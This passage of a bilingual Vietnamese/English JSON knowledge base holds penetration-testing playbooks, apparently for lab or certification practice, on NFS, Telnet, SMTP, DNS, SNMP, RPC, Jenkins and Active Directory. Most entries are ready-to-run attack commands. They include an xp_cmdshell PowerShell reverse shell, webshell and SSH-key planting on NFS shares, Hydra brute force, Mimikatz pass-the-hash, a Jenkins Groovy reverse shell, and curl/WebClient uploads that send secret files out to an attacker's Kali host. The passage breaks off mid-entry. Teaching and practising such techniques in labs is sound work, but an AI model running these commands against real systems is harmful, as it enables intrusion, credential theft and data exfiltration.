      { "vi": "**L·∫•y Shell (PowerShell Base64):**", "en": "**Get Shell (PowerShell Base64):**", "command": "EXEC xp_cmdshell 'powershell -e <base64_payload_to_kali_ip:4444>';" }
    ],
    "related_knowledge_ids": ["port_1433", "mssql", "nmap", "hydra", "impacket-mssqlclient", "msfconsole", "xp_cmdshell", "sqli_theory_connection", "sqli_rce_manual", "rce_kali_setup", "rce_powershell", "sqli_lab_capstone7_mssql_timebased"]
  },
  "playbook_33_foothold_nfs_mount": {
    "title": {
      "vi": "Playbook 33: Foothold qua NFS Mount (ƒê·ªçc/Ghi File)",
      "en": "Playbook 33: Foothold via NFS Mount (File Read/Write)"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 2049 (NFS) m·ªü. `showmount -e` hi·ªÉn th·ªã m·ªôt share c√≥ th·ªÉ mount (v√≠ d·ª•: `/home` ho·∫∑c `/var/www`).",
    "objective": "Mount NFS share ƒë·ªÉ ƒë·ªçc file nh·∫°y c·∫£m ho·∫∑c ghi file (v√≠ d·ª•: webshell, public key SSH) ƒë·ªÉ gi√†nh quy·ªÅn truy c·∫≠p.",
    "tools": ["nmap", "showmount", "mount", "cp", "ssh-keygen"],
    "phases": ["Initial Foothold", "Enumeration"],
    "techniques": ["NFS Enumeration", "NFS Mount", "File Read", "File Write"],
    "targets": ["NFS Share"],
    "os": ["Linux"],
    "tags": ["foothold", "nfs", "port_2049", "mount", "showmount", "file read", "file write", "webshell", "ssh key"],
    "content": "## Playbook 33: Foothold qua NFS Mount üö™üíæ‚û°Ô∏èüìÑ/üîë\n\n**Gi·∫£ ƒë·ªãnh:** NFS (2049) m·ªü, `showmount -e` hi·ªÉn th·ªã share c√≥ th·ªÉ mount.\n\n**M·ª•c ti√™u:** Mount share ƒë·ªÉ ƒë·ªçc/ghi file gi√†nh quy·ªÅn truy c·∫≠p.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Li·ªát k√™ Shares:** `showmount -e <target_ip>`.\n2.  **Mount Share tr√™n Kali:**\n    ```bash\n    sudo mkdir /mnt/nfs_target\n    sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_target -o nolock \n    ```\n   \n3.  **Enumeration tr√™n Share:** `ls -laR /mnt/nfs_target`.\n4.  **ƒê·ªçc File Nh·∫°y c·∫£m:** `cat /mnt/nfs_target/path/to/sensitive.conf`.\n5.  **Ghi File (N·∫øu c√≥):**\n    * Ghi Webshell: `sudo cp shell.php /mnt/nfs_target/`.\n    * Ghi SSH Key: `ssh-keygen`, `sudo cp ~/.ssh/id_rsa.pub /mnt/nfs_target/.ssh/authorized_keys`, `sudo chmod/chown`.\n6.  **Unmount Share:** `sudo umount /mnt/nfs_target`.",
    "steps": [
      { "vi": "**Li·ªát k√™ Shares:**", "en": "**List Shares:**", "command": "showmount -e <target_ip>" },
      { "vi": "**Mount Share (Kali):**", "en": "**Mount Share (Kali):**", "command": "sudo mkdir /mnt/nfs_target; sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_target -o nolock" },
      { "vi": "**Enum tr√™n Share:**", "en": "**Enum on Share:**", "command": "ls -laR /mnt/nfs_target" },
      { "vi": "**ƒê·ªçc File:**", "en": "**Read File:**", "command": "cat /mnt/nfs_target/path/to/config.bak" },
      { "vi": "**Ghi Webshell (N·∫øu mount web root):**", "en": "**Write Webshell (If web root mounted):**", "command": "sudo cp shell.php /mnt/nfs_target/" },
      { "vi": "**Ghi SSH Key (N·∫øu mount home dir):**", "en": "**Write SSH Key (If home dir mounted):**", "command": "ssh-keygen; sudo cp ~/.ssh/id_rsa.pub /mnt/nfs_target/.ssh/authorized_keys; sudo chmod 600 /mnt/nfs_target/.ssh/authorized_keys" },
      { "vi": "**ƒêƒÉng nh·∫≠p SSH (N·∫øu ghi key th√†nh c√¥ng):**", "en": "**Login SSH (If key write successful):**", "command": "ssh -i ~/.ssh/id_rsa <target_user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["port_2049", "nfs", "nfs_enumeration", "showmount", "mount", "cp", "ssh-keygen", "add_ssh_public_key", "chmod"]
  },
  "playbook_34_foothold_telnet_brute": {
    "title": {
      "vi": "Playbook 34: Foothold qua Telnet (Port 23) Brute-Force",
      "en": "Playbook 34: Foothold via Telnet (Port 23) Brute-Force"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 23 (Telnet) m·ªü. C√≥ danh s√°ch username.",
    "objective": "Gi√†nh quy·ªÅn truy c·∫≠p Telnet shell b·∫±ng t·∫•n c√¥ng brute-force.",
    "tools": ["nmap", "hydra", "telnet"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Brute Force", "Telnet Login"],
    "targets": ["Telnet Service"],
    "os": ["Any"],
    "tags": ["foothold", "telnet", "port_23", "brute force", "hydra", "cleartext"],
    "content": "## Playbook 34: Foothold qua Telnet Brute-Force üö™üîë‚û°Ô∏èüí≤\n\n**Gi·∫£ ƒë·ªãnh:** Telnet (Port 23) m·ªü, c√≥ danh s√°ch user.\n\n**C·∫¢NH B√ÅO:** Telnet g·ª≠i credentials d·∫°ng cleartext!\n\n**M·ª•c ti√™u:** Gi√†nh quy·ªÅn truy c·∫≠p Telnet.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Port:** `nmap -p 23 -sV <target_ip>`.\n2.  **Brute-Force Credentials:**\n    ```bash\n    hydra -L users.txt -P /path/to/rockyou.txt <target_ip> telnet \n    ```\n   \n3.  **K·∫øt n·ªëi Telnet:** `telnet <target_ip>`.",
    "steps": [
      { "vi": "**Brute-Force (Hydra):**", "en": "**Brute-Force (Hydra):**", "command": "hydra -L users.txt -P /path/to/rockyou.txt <target_ip> telnet" },
      { "vi": "**K·∫øt n·ªëi Telnet:**", "en": "**Connect Telnet:**", "command": "telnet <target_ip>" }
    ],
    "related_knowledge_ids": ["port_23", "telnet", "hydra", "nmap"]
  },
  "playbook_35_enum_smtp_users": {
    "title": {
      "vi": "Playbook 35: Enumeration - Li·ªát k√™ User SMTP (VRFY/EXPN)",
      "en": "Playbook 35: Enumeration - SMTP User Listing (VRFY/EXPN)"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 25 (SMTP) m·ªü. M√°y ch·ªß c√≥ th·ªÉ h·ªó tr·ª£ l·ªánh VRFY ho·∫∑c EXPN.",
    "objective": "X√°c ƒë·ªãnh c√°c username h·ª£p l·ªá tr√™n h·ªá th·ªëng th√¥ng qua m√°y ch·ªß SMTP.",
    "tools": ["nmap", "nc", "telnet", "smtp-user-enum"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["SMTP User Enumeration", "VRFY", "EXPN"],
    "targets": ["SMTP Server"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "smtp", "port_25", "user enumeration", "vrfy", "expn", "smtp-user-enum", "nmap"],
    "content": "## Playbook 35: Enumeration - Li·ªát k√™ User SMTP üïµÔ∏è‚Äç‚ôÇÔ∏èüìß\n\n**Gi·∫£ ƒë·ªãnh:** SMTP (Port 25) m·ªü, c√≥ th·ªÉ h·ªó tr·ª£ VRFY/EXPN.\n\n**M·ª•c ti√™u:** Li·ªát k√™ username h·ª£p l·ªá.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ki·ªÉm tra Th·ªß c√¥ng:** `nc -nv <target_ip> 25`, th·ª≠ `VRFY <user>`, `EXPN <list>`.\n2.  **Nmap Script:** `nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>`.\n3.  **smtp-user-enum:** `smtp-user-enum -M VRFY -U users.txt -t <target_ip>`.",
    "steps": [
      { "vi": "**Ki·ªÉm tra Th·ªß c√¥ng (nc):**", "en": "**Manual Check (nc):**", "command": "nc -nv <target_ip> 25" },
      { "vi": "**Th·ª≠ VRFY/EXPN:**", "en": "**Try VRFY/EXPN:**", "command": "VRFY username / EXPN listname" },
      { "vi": "**Nmap Script:**", "en": "**Nmap Script:**", "command": "nmap --script smtp-commands,smtp-enum-users -p 25 <target_ip>" },
      { "vi": "**smtp-user-enum (VRFY):**", "en": "**smtp-user-enum (VRFY):**", "command": "smtp-user-enum -M VRFY -U users.txt -t <target_ip>" }
    ],
    "related_knowledge_ids": ["port_25", "smtp", "vrfy", "expn", "nmap", "nc", "telnet", "smtp-user-enum", "smtp_enumeration_phishing"]
  },
  "playbook_36_enum_dns_zone_transfer": {
    "title": {
      "vi": "Playbook 36: Enumeration - DNS Zone Transfer (AXFR)",
      "en": "Playbook 36: Enumeration - DNS Zone Transfer (AXFR)"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 53 (DNS) m·ªü. ƒê√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c name server v√† domain name.",
    "objective": "Th·ª±c hi·ªán Zone Transfer ƒë·ªÉ l·∫•y to√†n b·ªô b·∫£n ghi DNS c·ªßa domain.",
    "tools": ["dig", "host", "dnsrecon", "dnsenum"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["DNS Zone Transfer", "AXFR"],
    "targets": ["DNS Server"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "dns", "port_53", "zone transfer", "axfr", "dig", "host", "dnsrecon", "dnsenum"],
    "content": "## Playbook 36: Enumeration - DNS Zone Transfer üïµÔ∏è‚Äç‚ôÇÔ∏èüó∫Ô∏è\n\n**Gi·∫£ ƒë·ªãnh:** DNS (Port 53) m·ªü, bi·∫øt name server v√† domain name.\n\n**M·ª•c ti√™u:** Th·ª±c hi·ªán Zone Transfer (AXFR).\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Name Server:** `host -t ns <domain_name>`.\n2.  **Th·ª≠ Zone Transfer (dig):** `dig axfr @<dns_server_ip> <domain_name>`.\n3.  **Th·ª≠ Zone Transfer (host):** `host -l <domain_name> <dns_server_ip>`.\n4.  **Th·ª≠ Zone Transfer (dnsrecon):** `dnsrecon -d <domain_name> -t axfr`.",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh Name Server:**", "en": "**Identify Name Server:**", "command": "host -t ns <domain_name>" },
      { "vi": "**Th·ª≠ AXFR (dig):**", "en": "**Attempt AXFR (dig):**", "command": "dig axfr @<dns_server_ip> <domain_name>" },
      { "vi": "**Th·ª≠ AXFR (host):**", "en": "**Attempt AXFR (host):**", "command": "host -l <domain_name> <dns_server_ip>" },
      { "vi": "**Th·ª≠ AXFR (dnsrecon):**", "en": "**Attempt AXFR (dnsrecon):**", "command": "dnsrecon -d <domain_name> -t axfr" }
    ],
    "related_knowledge_ids": ["port_53", "dns", "zone transfer", "axfr", "dig", "host", "dnsrecon", "dnsenum", "active_dns_enum", "aws_enum_dns_recon"]
  },
  "playbook_37_enum_snmp_details": {
    "title": {
      "vi": "Playbook 37: Enumeration - SNMP Chi ti·∫øt (Walk OIDs)",
      "en": "Playbook 37: Enumeration - Detailed SNMP (Walk OIDs)"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 161 (SNMP) m·ªü (UDP). ƒê√£ x√°c ƒë·ªãnh ƒë∆∞·ª£c community string (th∆∞·ªùng l√† 'public' ho·∫∑c 'private').",
    "objective": "S·ª≠ d·ª•ng `snmpwalk` ƒë·ªÉ truy v·∫•n c√°c OID c·ª• th·ªÉ nh·∫±m thu th·∫≠p th√¥ng tin chi ti·∫øt v·ªÅ h·ªá th·ªëng (Users, Processes, Software, Network).",
    "tools": ["nmap", "snmpwalk", "snmpcheck"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["SNMP Enumeration", "MIB Walking", "OID Querying"],
    "targets": ["SNMP Service", "Network Device", "Windows Host"],
    "os": ["Any"],
    "tags": ["enumeration", "recon", "snmp", "port_161", "snmpwalk", "snmpcheck", "oid", "mib", "windows"],
    "content": "## Playbook 37: Enumeration - SNMP Chi ti·∫øt üïµÔ∏è‚Äç‚ôÇÔ∏èüå≥\n\n**Gi·∫£ ƒë·ªãnh:** SNMP (Port 161 UDP) m·ªü, c√≥ community string (v√≠ d·ª•: 'public').\n\n**M·ª•c ti√™u:** Truy v·∫•n OID c·ª• th·ªÉ ƒë·ªÉ l·∫•y th√¥ng tin chi ti·∫øt.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Walk To√†n b·ªô MIB:** `snmpwalk -c public -v1 <target_ip>`.\n2.  **snmpcheck (T·ªïng qu√°t):** `snmp-check -t <target_ip> -c public`.\n3.  **Truy v·∫•n OID C·ª• th·ªÉ (Windows):**\n    * User Accounts: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.4.1.77.1.2.25`\n    * Running Programs: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.25.4.2.1.2`\n    * TCP Ports: `snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.6.13.1.3`.",
    "steps": [
      { "vi": "**Walk To√†n b·ªô MIB:**", "en": "**Walk Full MIB:**", "command": "snmpwalk -c public -v1 <target_ip>" },
      { "vi": "**snmpcheck:**", "en": "**snmpcheck:**", "command": "snmp-check -t <target_ip> -c public" },
      { "vi": "**Walk User Accounts:**", "en": "**Walk User Accounts:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.4.1.77.1.2.25" },
      { "vi": "**Walk Running Programs:**", "en": "**Walk Running Programs:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.25.4.2.1.2" },
      { "vi": "**Walk TCP Ports:**", "en": "**Walk TCP Ports:**", "command": "snmpwalk -c public -v1 <target_ip> 1.3.6.1.2.1.6.13.1.3" }
    ],
    "related_knowledge_ids": ["port_161", "snmp", "snmp_enumeration", "snmpwalk", "snmpcheck", "oid", "mib", "snmp_windows_mibs", "active_snmp_enum"]
  },
  "playbook_38_enum_rpc_details": {
    "title": {
      "vi": "Playbook 38: Enumeration - RPC Chi ti·∫øt (rpcclient)",
      "en": "Playbook 38: Enumeration - Detailed RPC (rpcclient)"
    },
    "assumption": "Nmap t√¨m th·∫•y Port 135 (RPC) v√†/ho·∫∑c 445 (SMB, th∆∞·ªùng d√πng RPC) m·ªü tr√™n m√°y Windows.",
    "objective": "S·ª≠ d·ª•ng `rpcclient` ƒë·ªÉ li·ªát k√™ th√¥ng tin h·ªá th·ªëng, users, groups, shares t·ª´ RPC endpoint.",
    "tools": ["nmap", "rpcclient"],
    "phases": ["Enumeration", "Reconnaissance"],
    "techniques": ["RPC Enumeration", "User Enumeration", "Group Enumeration", "Share Enumeration"],
    "targets": ["Windows RPC Service"],
    "os": ["Windows"],
    "tags": ["enumeration", "recon", "rpc", "port_135", "port_445", "rpcclient", "windows", "user enumeration", "share enumeration"],
    "content": "## Playbook 38: Enumeration - RPC Chi ti·∫øt üïµÔ∏è‚Äç‚ôÇÔ∏èüíª\n\n**Gi·∫£ ƒë·ªãnh:** RPC (Port 135/445) m·ªü tr√™n Windows.\n\n**M·ª•c ti√™u:** Li·ªát k√™ th√¥ng tin qua `rpcclient`.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **K·∫øt n·ªëi (Null Session):** `rpcclient -U \"\" -N <target_ip>`.\n2.  **K·∫øt n·ªëi (Creds):** `rpcclient -U '<domain>/<user>%<password>' <target_ip>`.\n3.  **L·ªánh Enum (trong rpcclient):** `srvinfo`, `enumdomusers`, `enumdomgroups`, `netshareenumall`, `queryuser <RID>`, `lookupnames <user>`, `lookupsids <SID>`.",
    "steps": [
      { "vi": "**K·∫øt n·ªëi Null Session:**", "en": "**Connect Null Session:**", "command": "rpcclient -U \"\" -N <target_ip>" },
      { "vi": "**K·∫øt n·ªëi V·ªõi Creds:**", "en": "**Connect With Creds:**", "command": "rpcclient -U '<domain>/<user>%<password>' <target_ip>" },
      { "vi": "**Li·ªát k√™ Users (rpc>):**", "en": "**List Users (rpc>):**", "command": "enumdomusers" },
      { "vi": "**Li·ªát k√™ Shares (rpc>):**", "en": "**List Shares (rpc>):**", "command": "netshareenumall" },
      { "vi": "**Th√¥ng tin Server (rpc>):**", "en": "**Server Info (rpc>):**", "command": "srvinfo" }
    ],
    "related_knowledge_ids": ["rpc_enumeration", "rpcclient", "port_135", "port_445"]
  },
  "playbook_39_foothold_jenkins_groovy": {
    "title": {
      "vi": "Playbook 39: Foothold qua Jenkins Script Console (Groovy RCE)",
      "en": "Playbook 39: Foothold via Jenkins Script Console (Groovy RCE)"
    },
    "assumption": "Ph√°t hi·ªán Jenkins ƒëang ch·∫°y tr√™n web server. C√≥ quy·ªÅn truy c·∫≠p v√†o Script Console (`/script`) (th∆∞·ªùng c·∫ßn creds admin, ho·∫∑c ƒë√¥i khi b·ªã l·ªô).",
    "objective": "Th·ª±c thi Groovy script ƒë·ªÉ gi√†nh reverse shell.",
    "tools": ["nmap", "gobuster", "curl", "nc", "groovy"],
    "phases": ["Initial Foothold", "Exploitation"],
    "techniques": ["Jenkins Exploitation", "Groovy Scripting", "RCE", "Reverse Shell"],
    "targets": ["Jenkins"],
    "os": ["Any (Server OS)"],
    "tags": ["foothold", "jenkins", "groovy", "rce", "reverse shell", "script console"],
    "content": "## Playbook 39: Foothold qua Jenkins Script Console üö™üë®‚Äçüíª‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** Jenkins ƒëang ch·∫°y, c√≥ quy·ªÅn truy c·∫≠p `/script`.\n\n**M·ª•c ti√™u:** RCE qua Groovy script ƒë·ªÉ l·∫•y reverse shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Truy c·∫≠p Script Console:** `http://<target_ip>:[PORT]/script`.\n2.  **Chu·∫©n b·ªã Payload Groovy:** (Copy payload reverse shell, thay IP/Port).\n3.  **M·ªü Listener:** `rlwrap nc -lvnp [PORT]`.\n4.  **Th·ª±c thi Script:** D√°n payload v√†o Console v√† Run.",
    "steps": [
      { "vi": "**Truy c·∫≠p Script Console:**", "en": "**Access Script Console:**", "command": "http://<target_ip>:[PORT]/script" },
      { "vi": "**Chu·∫©n b·ªã Payload Groovy:**", "en": "**Prepare Groovy Payload:**", "command": "# Copy Groovy code, replace KALI_IP and PORT (see knowledge_base for code)" },
      { "vi": "**M·ªü Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp [PORT]" },
      { "vi": "**D√°n & Ch·∫°y Script:**", "en": "**Paste & Run Script:**", "command": "# Paste Groovy code into Jenkins Script Console and click Run" }
    ],
    "related_knowledge_ids": ["exploitation_reverse_shell_groovy_jenkins", "jenkins", "groovy", "rce", "reverse_shell", "nc", "rce_kali_setup"]
  },
  "playbook_40_ad_overpass_the_hash": {
    "title": {
      "vi": "Playbook 40: AD Attack - Overpass the Hash",
      "en": "Playbook 40: AD Attack - Overpass the Hash"
    },
    "assumption": "ƒê√£ c√≥ NTLM hash c·ªßa m·ªôt user domain. C·∫ßn truy c·∫≠p c√°c d·ªãch v·ª• s·ª≠ d·ª•ng x√°c th·ª±c Kerberos thay v√¨ NTLM.",
    "objective": "S·ª≠ d·ª•ng NTLM hash ƒë·ªÉ y√™u c·∫ßu Kerberos TGT, sau ƒë√≥ s·ª≠ d·ª•ng TGT ƒë√≥ ƒë·ªÉ x√°c th·ª±c.",
    "tools": ["mimikatz", "klist"],
    "phases": ["Lateral Movement", "Privilege Escalation"],
    "techniques": ["Overpass the Hash", "Pass the Hash", "Kerberos Attack"],
    "targets": ["Active Directory Accounts", "Kerberos Services"],
    "os": ["Windows"],
    "tags": ["ad", "active directory", "overpass the hash", "pass the hash", "pth", "kerberos", "tgt", "mimikatz", "klist"],
    "content": "## Playbook 40: AD Attack - Overpass the Hash üö∂‚Äç‚ôÇÔ∏èüîë‚û°Ô∏èüé´‚û°Ô∏èüíª\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ NTLM hash, c·∫ßn truy c·∫≠p d·ªãch v·ª• Kerberos.\n\n**M·ª•c ti√™u:** D√πng NTLM hash l·∫•y TGT Kerberos.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ch·∫°y Mimikatz PTH:** `privilege::debug; sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTHash> /run:powershell.exe`.\n2.  **X√°c minh Ticket (PowerShell m·ªõi):** `klist`.\n3.  **Truy c·∫≠p D·ªãch v·ª• (PowerShell m·ªõi):** `Enter-PSSession -ComputerName <target>`, `dir \\\\<server>\\share$`.",
    "steps": [
      { "vi": "**Ch·∫°y Mimikatz PTH:**", "en": "**Run Mimikatz PTH:**", "command": "privilege::debug; sekurlsa::pth /user:<username> /domain:<domain.local> /ntlm:<NTHash> /run:powershell.exe" },
      { "vi": "**X√°c minh Ticket (PowerShell m·ªõi):**", "en": "**Verify Ticket (New PowerShell):**", "command": "klist" },
      { "vi": "**Truy c·∫≠p T√†i nguy√™n (PowerShell m·ªõi):**", "en": "**Access Resource (New PowerShell):**", "command": "Enter-PSSession -ComputerName <target_server>" }
    ],
    "related_knowledge_ids": ["overpass_the_hash", "pass_the_hash", "mimikatz", "sekurlsa::pth", "klist", "kerberos"]
  },
  "playbook_41_file_transfer_http_upload": {
    "title": {
      "vi": "Playbook 41: File Transfer - T·∫£i File l√™n Target qua HTTP Server",
      "en": "Playbook 41: File Transfer - Uploading Files to Target via HTTP Server"
    },
    "assumption": "C√≥ shell tr√™n m√°y target (Linux/Windows). Target c√≥ th·ªÉ k·∫øt n·ªëi HTTP ra m√°y Kali.",
    "objective": "Chuy·ªÉn file t·ª´ Kali l√™n m√°y target.",
    "tools": ["python", "wget", "curl", "certutil", "powershell (iwr, WebClient)"],
    "phases": ["Post Exploitation", "Exploitation"],
    "techniques": ["File Transfer"],
    "targets": ["Linux", "Windows"],
    "os": ["Any"],
    "tags": ["file transfer", "upload to target", "http server", "python", "wget", "curl", "certutil", "powershell", "iwr", "webclient"],
    "content": "## Playbook 41: File Transfer - T·∫£i l√™n Target qua HTTP ‚¨ÜÔ∏èüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell, target k·∫øt n·ªëi ƒë∆∞·ª£c HTTP ra Kali.\n\n**M·ª•c ti√™u:** Chuy·ªÉn file t·ª´ Kali l√™n target.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Server (Kali):** `python3 -m http.server 80`.\n2.  **T·∫£i v·ªÅ (Target Linux):** `wget http://<kali_ip>/file -O /tmp/file` ho·∫∑c `curl http://<kali_ip>/file -o /tmp/file`.\n3.  **T·∫£i v·ªÅ (Target Windows):** `iwr ... -Outfile C:\\Temp\\file` ho·∫∑c `certutil ... C:\\Temp\\file`.",
    "steps": [
      { "vi": "**Ch·∫°y HTTP Server (Kali):**", "en": "**Run HTTP Server (Kali):**", "command": "python3 -m http.server 80" },
      { "vi": "**T·∫£i v·ªÅ Target (Linux - wget):**", "en": "**Download on Target (Linux - wget):**", "command": "wget http://<kali_ip>/linpeas.sh -O /tmp/linpeas.sh" },
      { "vi": "**T·∫£i v·ªÅ Target (Linux - curl):**", "en": "**Download on Target (Linux - curl):**", "command": "curl http://<kali_ip>/linpeas.sh -o /tmp/linpeas.sh" },
      { "vi": "**T·∫£i v·ªÅ Target (Windows - iwr):**", "en": "**Download on Target (Windows - iwr):**", "command": "iwr -uri http://<kali_ip>/winPEASx64.exe -Outfile C:\\Windows\\Temp\\winPEASx64.exe" },
      { "vi": "**T·∫£i v·ªÅ Target (Windows - certutil):**", "en": "**Download on Target (Windows - certutil):**", "command": "certutil -urlcache -split -f http://<kali_ip>/winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe" }
    ],
    "related_knowledge_ids": ["file_transfer_http_upload", "python", "wget", "curl", "certutil", "powershell", "iwr", "webclient", "file_transfer_download_linux", "file_transfer_download_windows"]
  },
  "playbook_42_file_transfer_smb_upload": {
    "title": {
      "vi": "Playbook 42: File Transfer - T·∫£i File l√™n Target qua SMB Server",
      "en": "Playbook 42: File Transfer - Uploading Files to Target via SMB Server"
    },
    "assumption": "C√≥ shell tr√™n m√°y target Windows. Target c√≥ th·ªÉ k·∫øt n·ªëi SMB ra m√°y Kali.",
    "objective": "Chuy·ªÉn file t·ª´ Kali l√™n m√°y target Windows b·∫±ng SMB.",
    "tools": ["impacket-smbserver", "copy", "powershell (iwr)"],
    "phases": ["Post Exploitation", "Exploitation"],
    "techniques": ["File Transfer"],
    "targets": ["Windows"],
    "os": ["Windows", "Linux (Kali for server)"],
    "tags": ["file transfer", "upload to target", "smb server", "impacket-smbserver", "windows", "copy", "iwr", "unc path"],
    "content": "## Playbook 42: File Transfer - T·∫£i l√™n Target qua SMB ‚¨ÜÔ∏èüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell Windows, target k·∫øt n·ªëi ƒë∆∞·ª£c SMB ra Kali.\n\n**M·ª•c ti√™u:** Chuy·ªÉn file t·ª´ Kali l√™n target b·∫±ng SMB.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Server (Kali):** `sudo impacket-smbserver -smb2support SHARE .`.\n2.  **T·∫£i v·ªÅ (Target Windows - copy):** `copy \\\\KALI_IP\\SHARE\\file C:\\Temp\\file`.\n3.  **T·∫£i v·ªÅ (Target Windows - iwr):** `iwr -uri \\\\KALI_IP\\SHARE\\file -Outfile C:\\Temp\\file`.",
    "steps": [
      { "vi": "**Ch·∫°y SMB Server (Kali):**", "en": "**Run SMB Server (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE ." },
      { "vi": "**T·∫£i v·ªÅ Target (Windows - copy):**", "en": "**Download on Target (Windows - copy):**", "command": "copy \\\\KALI_IP\\SHARE\\winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe" },
      { "vi": "**T·∫£i v·ªÅ Target (Windows - iwr):**", "en": "**Download on Target (Windows - iwr):**", "command": "iwr -uri \\\\KALI_IP\\SHARE\\winPEASx64.exe -Outfile C:\\Windows\\Temp\\winPEASx64.exe" }
    ],
    "related_knowledge_ids": ["file_transfer_smb_upload", "impacket-smbserver", "copy", "iwr", "unc_path", "certutil"]
  },
  "playbook_43_file_transfer_http_download": {
    "title": {
      "vi": "Playbook 43: File Transfer - T·∫£i File t·ª´ Target v·ªÅ Kali qua HTTP Upload Server",
      "en": "Playbook 43: File Transfer - Downloading Files from Target via HTTP Upload Server"
    },
    "assumption": "C√≥ shell tr√™n m√°y target (Linux/Windows). Target c√≥ th·ªÉ k·∫øt n·ªëi HTTP ra m√°y Kali.",
    "objective": "Chuy·ªÉn file t·ª´ target v·ªÅ Kali.",
    "tools": ["python (SimpleHTTPServerWithUpload.py)", "curl", "powershell (WebClient)"],
    "phases": ["Post Exploitation"],
    "techniques": ["File Transfer", "Exfiltration"],
    "targets": ["Linux", "Windows"],
    "os": ["Any"],
    "tags": ["file transfer", "download from target", "exfiltration", "http server", "python", "upload", "curl", "webclient"],
    "content": "## Playbook 43: File Transfer - T·∫£i v·ªÅ Kali qua HTTP Upload ‚¨áÔ∏èüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell, target k·∫øt n·ªëi ƒë∆∞·ª£c HTTP ra Kali.\n\n**M·ª•c ti√™u:** Chuy·ªÉn file t·ª´ target v·ªÅ Kali.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Server (Kali):** `python3 SimpleHTTPServerWithUpload.py 8000`.\n2.  **Upload (Target Linux):** `curl -F 'file=@/path/file' http://<kali_ip>:8000`.\n3.  **Upload (Target Windows):** `(New-Object Net.WebClient).UploadFile('http://<kali_ip>:8000', 'C:\\path\\file')`.",
    "steps": [
      { "vi": "**Ch·∫°y HTTP Upload Server (Kali):**", "en": "**Run HTTP Upload Server (Kali):**", "command": "python3 SimpleHTTPServerWithUpload.py 8000" },
      { "vi": "**Upload t·ª´ Target (Linux - curl):**", "en": "**Upload from Target (Linux - curl):**", "command": "curl -F 'file=@/path/to/secret.txt' http://<kali_ip>:8000" },
      { "vi": "**Upload t·ª´ Target (Windows - PS):**", "en": "**Upload from Target (Windows - PS):**", "command": "(New-Object System.Net.WebClient).UploadFile('http://<kali_ip>:8000', 'C:\\path\\to\\secret.txt')" }
    ],
    "related_knowledge_ids": ["file_transfer_http_download", "python", "upload", "curl", "webclient"]
  },
  "playbook_44_file_transfer_smb_download": {
    "title": {
      "vi": "Playbook 44: File Transfer - T·∫£i File t·ª´ Target v·ªÅ Kali qua SMB Server",
      "en": "Playbook 44: File Transfer - Downloading Files from Target via SMB Server"
    },
    "assumption": "C√≥ shell tr√™n m√°y target Windows. Target c√≥ th·ªÉ k·∫øt n·ªëi SMB ra m√°y Kali.",
    "objective": "Chuy·ªÉn file t·ª´ target Windows v·ªÅ Kali b·∫±ng SMB.",
    "tools": ["impacket-smbserver", "copy"],
    "phases": ["Post Exploitation"],
    "techniques": ["File Transfer", "Exfiltration"],
    "targets": ["Windows"],
    "os": ["Windows", "Linux (Kali for server)"],
    "tags": ["file transfer", "download from target", "exfiltration", "smb server", "impacket-smbserver", "windows", "copy", "unc path"],
    "content": "## Playbook 44: File Transfer - T·∫£i v·ªÅ Kali qua SMB ‚¨áÔ∏èüìÑ\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell Windows, target k·∫øt n·ªëi ƒë∆∞·ª£c SMB ra Kali.\n\n**M·ª•c ti√™u:** Chuy·ªÉn file t·ª´ target v·ªÅ Kali b·∫±ng SMB.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Server (Kali):** `sudo impacket-smbserver -smb2support SHARE .`.\n2.  **Upload (Target Windows):** `copy C:\\path\\file \\\\KALI_IP\\SHARE\\file`.",
    "steps": [
